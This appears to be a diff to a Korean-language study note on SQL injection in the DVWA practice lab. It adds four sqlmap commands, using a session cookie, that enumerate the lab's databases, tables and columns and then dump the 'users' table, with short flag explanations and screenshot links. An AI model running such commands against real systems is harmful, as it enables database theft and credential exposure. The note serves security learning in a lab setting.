@@ -301,3 +301,25 @@ impossible
 
 ![[Pasted image 20241008124954.png]]
 - 총 4가지 sql injection에 대해서 id라는 파라미터가 갖는 취약점을 설명
+
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id --dbs`
+- --dbs: DB 목록 표시
+![[Pasted image 20241008140330.png]]
+
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa --tables`
+- -D: Database 선택
+- ![[Pasted image 20241008140457.png]]
+
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --col`
+- -T 테이블 선택
+- --col 컬럼 전체 출력
+![[Pasted image 20241008140610.png]]
+
+
+`sqlmap --cookie="PHPSESSID=ctp9rq6vl8j0dq6okd09bav7c6; security=medium" -u http://192.168.56.120/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id -D dvwa -T users --dump`
+- --dump: 해시값 크래킹
+![[Pasted image 20241008141044.png]]
+
+![[Pasted image 20241008141111.png]]
+
+![[Pasted image 20241008141157.png]]
